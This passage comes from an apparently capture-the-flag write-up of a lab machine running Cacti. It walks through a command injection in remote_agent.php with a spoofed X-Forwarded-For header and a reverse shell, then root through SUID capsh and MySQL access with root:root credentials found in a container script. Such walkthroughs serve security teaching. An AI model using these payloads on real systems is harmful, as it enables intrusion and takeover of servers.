</span></span><span class="z-source z-shell z-bash">              <span class="z-keyword z-control z-conditional z-if z-shell">if</span> <span class="z-support z-function z-test z-begin z-shell">[</span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">RESPONSE</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-keyword z-operator z-logical z-shell">!=</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>[]<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-support z-function z-test z-end z-shell">]</span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-keyword z-control z-conditional z-then z-shell">then</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
</span></span><span class="z-source z-shell z-bash">                  <span class="z-variable z-other z-readwrite z-assignment z-shell">RRD_NAME</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">RESPONSE</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">jq</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>.[0].rrd_name<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span></span><span class="z-meta z-function-call z-shell"></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
</span></span><span class="z-source z-shell z-bash">                  <span class="z-keyword z-control z-conditional z-if z-shell">if</span> <span class="z-meta z-function-call z-arguments z-shell"><span class="z-support z-function z-double-brace z-begin z-shell">[[</span> <span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">RRD_NAME</span></span> <span class="z-keyword z-operator z-logical z-shell">==</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>polling_time<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-keyword z-operator z-logical z-shell">||</span> <span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">RRD_NAME</span></span> <span class="z-keyword z-operator z-logical z-shell">==</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>uptime<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-support z-function z-double-brace z-end z-shell">]]</span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-keyword z-control z-conditional z-then z-shell">then</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
</span></span><span class="z-source z-shell z-bash">                      <span class="z-variable z-other z-readwrite z-assignment z-shell">HOST_ID</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">i</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span><span class="z-meta z-function-call z-shell"></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
</span></span><span class="z-source z-shell z-bash">                      <span class="z-variable z-other z-readwrite z-assignment z-shell">LOCAL_DATA_ID</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">j</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span><span class="z-meta z-function-call z-shell"></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
</span></span><span class="z-source z-shell z-bash">                  <span class="z-keyword z-control z-flow z-break z-shell">break</span><span class="z-meta z-function-call z-arguments z-shell"> 2</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
</span></span><span class="z-source z-shell z-bash">              <span class="z-keyword z-control z-conditional z-end z-shell">fi</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
</span></span><span class="z-source z-shell z-bash">          <span class="z-keyword z-control z-conditional z-end z-shell">fi</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
</span></span><span class="z-source z-shell z-bash">      <span class="z-keyword z-control z-loop z-end z-shell">done</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
</span></span><span class="z-source z-shell z-bash">  <span class="z-keyword z-control z-loop z-end z-shell">done</span>
</span></code></pre>
<p>With these values, we can execute our command.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/dev/null<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>H</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>X-Forwarded-For: 127.0.0.1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://10.10.11.211/remote_agent.php<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>G</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>action=polldata<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>host_id=<span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">HOST_ID</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>local_data_ids[]=<span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">LOCAL_DATA_ID</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>poller_id=;&#39;/bin/bash&#39; -c &#39;<span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">REVSHELL_PAYLOAD</span></span>&#39;<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<p>If we check our listener:</p>
<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.10] from (UNKNOWN) [10.10.11.211] 47556
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">www-data@50bca5e748b0:/var/www/html$
</span></code></pre>
<p>It caught the reverse shell!</p>
<h3 id="spawning-a-pty">Spawning a pty</h3>
<p>Let's use this one-liner to spawn a pty:</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">script</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/dev/null<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>qc</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/bin/bash<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<h2 id="system-enumeration">System enumeration</h2>
<p>We're actually in a Docker container, and the <code>/etc/hosts</code> file indicates that
our current IP is <code>172.19.0.3</code>. Therefore, I'll skip the 'Getting a lay of the
land' section, an directly get to the crux of the matter.</p>
<h3 id="suid">SUID</h3>
<p>Let's look for SUID binaries.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@50bca5e748b0:/var/www/html$</span></span><span class="z-meta z-function-call z-arguments z-shell"> find <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>perm</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>4000</span> <span class="z-constant z-numeric z-integer z-decimal z-file-descriptor z-shell">2</span><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span><span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/dev/null<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">/usr/bin/gpasswd
</span><span class="z-text z-plain">/usr/bin/passwd
</span><span class="z-text z-plain">/usr/bin/chsh
</span><span class="z-text z-plain">/usr/bin/chfn
</span><span class="z-text z-plain">/usr/bin/newgrp
</span><span class="z-text z-plain">/sbin/capsh
</span><span class="z-text z-plain">/bin/mount
</span><span class="z-text z-plain">/bin/umount
</span><span class="z-text z-plain">/bin/su
</span></code></pre>
<p>The <code>/sbin/capsh</code> binary is interesting!</p>
<h2 id="privilege-escalation-suid">Privilege escalation (SUID)</h2>
<p>If we search <a href="https://gtfobins.github.io/">GTFOBins</a> for <code>capsh</code>, we find
<a href="https://gtfobins.github.io/gtfobins/capsh/">an entry</a>. Luckily, it has a
<a href="https://gtfobins.github.io/gtfobins/capsh/#suid">'SUID' section</a>!</p>
<h3 id="exploitation-1">Exploitation</h3>
<p>I'll use the given command to abuse the SUID permission on this binary:</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@50bca5e748b0:/var/www/html$</span></span><span class="z-meta z-function-call z-arguments z-shell"> /sbin/capsh<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>gid</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span><span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>0<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>uid</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span><span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>0<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-keyword z-operator z-end-of-options z-shell"> --</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">root@50bca5e748b0:/var/www/html#
</span></code></pre>
<p>Yay!</p>
<h2 id="system-enumeration-1">System enumeration</h2>
<h3 id="inspecting-entrypoint-sh">Inspecting <code>/entrypoint.sh</code></h3>
<p>If we explore the filesystem, we find an entrypoint for the Docker container.
Let's check it:</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell">!/bin/bash</span><span class="z-comment z-line z-number-sign z-shell">
</span></span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-support z-function z-set z-shell">set</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell">-</span>ex</span></span>
</span><span class="z-source z-shell z-bash">
</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">wait-for-it</span></span><span class="z-meta z-function-call z-arguments z-shell"> db:3306<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>t</span> 300<span class="z-keyword z-operator z-end-of-options z-shell"> --</span></span><span class="z-meta z-function-call z-arguments z-shell"> echo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>database is connected<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span><span class="z-source z-shell z-bash"><span class="z-keyword z-control z-conditional z-if z-shell">if</span> <span class="z-meta z-function-call z-arguments z-shell"><span class="z-support z-function z-double-brace z-begin z-shell">[[</span> <span class="z-keyword z-operator z-logical z-shell">!</span> <span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mysql</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>host</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span>db<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>user</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span>root<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>password</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span>root cacti<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>e</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>show tables<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span> <span class="z-keyword z-operator z-logical z-shell">=~</span> <span class="z-meta z-regexp z-shell"><span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>automation_devices<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-support z-function z-double-brace z-end z-shell">]]</span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-keyword z-control z-conditional z-then z-shell">then</span>
</span><span class="z-source z-shell z-bash">    <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mysql</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>host</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span>db<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>user</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span>root<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>password</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span>root cacti <span class="z-keyword z-operator z-assignment z-redirection z-shell">&lt;</span>/var/www/html/cacti.sql</span>
</span><span class="z-source z-shell z-bash">    <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mysql</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>host</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span>db<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>user</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span>root<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>password</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span>root cacti<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>e</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>UPDATE user_auth SET must_change_password=&#39;&#39; WHERE username = &#39;admin&#39;<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span><span class="z-source z-shell z-bash">    <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mysql</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>host</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span>db<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>user</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span>root<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>password</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span>root cacti<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>e</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>SET GLOBAL time_zone = &#39;UTC&#39;<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span><span class="z-source z-shell z-bash"><span class="z-keyword z-control z-conditional z-end z-shell">fi</span>
</span><span class="z-source z-shell z-bash">
</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">chown</span></span><span class="z-meta z-function-call z-arguments z-shell"> www-data:www-data<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>R</span> /var/www/html</span>
</span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> first arg is `-f` or `--some-option`</span><span class="z-comment z-line z-number-sign z-shell">
</span></span><span class="z-source z-shell z-bash"><span class="z-keyword z-control z-conditional z-if z-shell">if</span> <span class="z-support z-function z-test z-begin z-shell">[</span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-expansion z-parameter z-begin z-shell">{</span></span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-variable z-other z-readwrite z-shell">1<span class="z-keyword z-operator z-expansion z-shell">#</span></span></span><span class="z-meta z-group z-expansion z-parameter z-shell">-</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-section z-expansion z-parameter z-end z-shell">}</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-keyword z-operator z-logical z-shell">!=</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">1</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-support z-function z-test z-end z-shell">]</span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-keyword z-control z-conditional z-then z-shell">then</span>
</span><span class="z-source z-shell z-bash">    <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-set z-shell">set</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-end-of-options z-shell"> --</span></span><span class="z-meta z-function-call z-arguments z-shell"> apache2-foreground <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-language z-shell">@</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span><span class="z-source z-shell z-bash"><span class="z-keyword z-control z-conditional z-end z-shell">fi</span>
</span><span class="z-source z-shell z-bash">
</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-support z-function z-exec z-shell">exec</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-language z-shell">@</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<p>This script basically connects to the MySQL database on the <code>db</code> host with the
credentials <code>root</code>:<code>root</code> and changes a few tables.</p>
<h1 id="host-172-19-0-2">Host <code>172.19.0.2</code></h1>
<h2 id="services-enumeration-1">Services enumeration</h2>
<h3 id="mysql">MySQL</h3>
<p>Let's connect to the MySQL server running on <code>db</code> using the credentials we just
found:</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">notch@Blocky:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> mysql<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>h</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>db<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>root<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span><span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>root<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">MySQL [(none)]&gt;
</span></code></pre>
<h4 id="version">Version</h4>
<p>Let's find out the version of MySQL in use.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">MySQL</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-keyword z-control z-regexp z-set z-begin z-shell">[</span>(none)<span class="z-keyword z-control z-regexp z-set z-end z-shell">]</span><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> SELECT @@version</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">+-----------+
</span><span class="z-text z-plain">| @@version |
</span><span class="z-text z-plain">+-----------+
</span><span class="z-text z-plain">| 5.7.40    |
</span><span class="z-text z-plain">+-----------+
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<p>So it's MySQL version <code>5.7.40</code>.</p>
<h4 id="databases">Databases</h4>
<p>Now, let's see which databases are available.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">MySQL</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-keyword z-control z-regexp z-set z-begin z-shell">[</span>(none)<span class="z-keyword z-control z-regexp z-set z-end z-shell">]</span><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> SHOW databases</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">+--------------------+
</span><span class="z-text z-plain">| Database           |
</span><span class="z-text z-plain">+--------------------+
</span><span class="z-text z-plain">| information_schema |
</span><span class="z-text z-plain">| cacti              |
</span><span class="z-text z-plain">| mysql              |
</span><span class="z-text z-plain">| performance_schema |
</span><span class="z-text z-plain">| sys                |
</span><span class="z-text z-plain">+--------------------+
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<p>The <code>cacti</code> database is the probably the most interesting (it's also the one
used by the website).</p>
<h4 id="cacti-s-tables"><code>cacti</code>'s tables</h4>
<p>Let's see which tables are included in this database.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">MySQL</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-keyword z-control z-regexp z-set z-begin z-shell">[</span>(none)<span class="z-keyword z-control z-regexp z-set z-end z-shell">]</span><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> SHOW tables</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">+-------------------------------------+
</span><span class="z-text z-plain">| Tables_in_cacti                     |
</span><span class="z-text z-plain">+-------------------------------------+
</span><span class="z-text z-plain">| aggregate_graph_templates           |
</span><span class="z-text z-plain">| aggregate_graph_templates_graph     |
</span><span class="z-text z-plain">| aggregate_graph_templates_item      |
</span><span class="z-text z-plain">| aggregate_graphs                    |
</span><span class="z-text z-plain">| aggregate_graphs_graph_item         |
</span><span class="z-text z-plain">| aggregate_graphs_items              |
</span><span class="z-text z-plain">| automation_devices                  |
</span><span class="z-text z-plain">| automation_graph_rule_items         |
</span><span class="z-text z-plain">| automation_graph_rules              |
</span><span class="z-text z-plain">| automation_ips                      |
</span><span class="z-text z-plain">| automation_match_rule_items         |
</span><span class="z-text z-plain">| automation_networks                 |
</span><span class="z-text z-plain">| automation_processes                |
</span><span class="z-text z-plain">| automation_snmp                     |
</span><span class="z-text z-plain">| automation_snmp_items               |
</span><span class="z-text z-plain">| automation_templates                |
</span><span class="z-text z-plain">| automation_tree_rule_items          |
</span><span class="z-text z-plain">| automation_tree_rules               |
</span><span class="z-text z-plain">| cdef                                |
</span><span class="z-text z-plain">| cdef_items                          |
</span><span class="z-text z-plain">| color_template_items                |
</span><span class="z-text z-plain">| color_templates                     |
</span><span class="z-text z-plain">| colors                              |
</span><span class="z-text z-plain">| data_debug                          |
</span><span class="z-text z-plain">| data_input                          |
</span><span class="z-text z-plain">| data_input_data                     |
</span><span class="z-text z-plain">| data_input_fields                   |
</span><span class="z-text z-plain">| data_local                          |
</span><span class="z-text z-plain">| data_source_profiles                |
</span><span class="z-text z-plain">| data_source_profiles_cf             |
</span><span class="z-text z-plain">| data_source_profiles_rra            |
</span><span class="z-text z-plain">| data_source_purge_action            |
</span><span class="z-text z-plain">| data_source_purge_temp              |
